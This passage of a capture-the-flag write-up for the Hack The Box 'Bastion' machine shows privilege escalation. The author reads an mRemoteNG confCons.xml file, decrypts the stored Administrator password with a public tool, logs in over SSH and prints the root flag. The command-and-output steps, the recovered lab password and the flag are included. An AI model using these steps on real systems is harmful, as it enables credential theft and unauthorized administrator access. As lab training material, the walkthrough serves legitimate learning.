+	 Volume Serial Number is 0CB3-C487                                                                                                                                                                    
+	                                                                                                                                                                                                      
+	 Directory of C:\Program Files (x86)                                                                                                                                                                  
+	                                                                                                                                                                                                      
+	22-02-2019  15:01    <DIR>          .                                                                                                                                                                 
+	22-02-2019  15:01    <DIR>          ..                                                                                                                                                                
+	16-07-2016  15:23    <DIR>          Common Files                                                                                                                                                      
+	23-02-2019  10:38    <DIR>          Internet Explorer                                                                                                                                                 
+	16-07-2016  15:23    <DIR>          Microsoft.NET                                                                                                                                                     
+	22-02-2019  15:01    <DIR>          mRemoteNG                                                                                                                                                         
+	23-02-2019  11:22    <DIR>          Windows Defender                                                                                                                                                  
+	23-02-2019  10:38    <DIR>          Windows Mail                                                                                                                                                      
+	23-02-2019  11:22    <DIR>          Windows Media Player                                                                                                                                              
+	16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                                                                                                                       
+	16-07-2016  15:23    <DIR>          Windows NT                                                                                                                                                        
+	23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                                                                                                              
+	16-07-2016  15:23    <DIR>          Windows Portable Devices                                                                                                                                          
+	16-07-2016  15:23    <DIR>          WindowsPowerShell 
+	
+	
+	We see mRemoteNG , remote connection manager for Windows which uses XML file to save passwords in encrypted format
+	More info here : http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html
+	
+	
+	Since appdata folder is hidden  enter "attrib -s -h C:\Users\myusername\AppData" ,  
+	https://www.windows10themes.net/guides/how-to-view-the-appdata-folder-in-windows-10/
+	
+14. l4mpje@BASTION C:\Users\Public>attrib -s -h C:\Users\L4mpje\AppData 
+15. l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                                                                                            
+	<?xml version="1.0" encoding="utf-8"?>                                                                                                                                                                
+	<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC                                                                      
+	M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0                                                                      
+	oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                                                                                            
+	    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna                                                                      
+	me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="                                                                      
+	 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend                                                                      
+	eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo                                                                      
+	ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp                                                                      
+	layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R                                                                      
+	edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire                                                                      
+	ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn                                                                      
+	coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa                                                                      
+	ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna                                                                      
+	me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="                                                                      
+	false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab                                                                      
+	leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I                                                                      
+	nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"                                                                      
+	 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe                                                                      
+	ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS                                                                      
+	ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa                                                                      
+	lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad                                                                      
+	BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri 
+	
+	
+	For Decrypting I used a tool mremoteng_decrypt
+	https://github.com/kmahyyg/mremoteng-decrypt
+	   
+	
+16. root@kali:~/newgits/mRemoteNG-Decrypt# python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+	Password: thXLHM96BeKL0ER2
+	 
+17. root@kali:~/newgits/mRemoteNG-Decrypt# ssh Administrator@10.10.10.134
+	Administrator@10.10.10.134's password: 
+	Microsoft Windows [Version 10.0.14393]                                                                                          
+	(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+	
+	administrator@BASTION C:\Users\Administrator>whoami                                                                             
+	bastion\administrator                                                                                                           
+	
+	administrator@BASTION C:\Users\Administrator>cd Desktop                                                                         
+	
+	administrator@BASTION C:\Users\Administrator\Desktop>dir                                                                        
+	 Volume in drive C has no label.                                                                                                
+	 Volume Serial Number is 0CB3-C487                                                                                              
+	
+	 Directory of C:\Users\Administrator\Desktop                                                                                    
+	
+	23-02-2019  10:40    <DIR>          .                                                                                           
+	23-02-2019  10:40    <DIR>          ..                                                                                          
+	23-02-2019  10:07                32 root.txt                                                                                    
+	               1 File(s)             32 bytes                                                                                   
+	               2 Dir(s)  11.301.339.136 bytes free                                                                              
+	
+	administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                              
+  958850b91811676ed6620a9c430e65c8
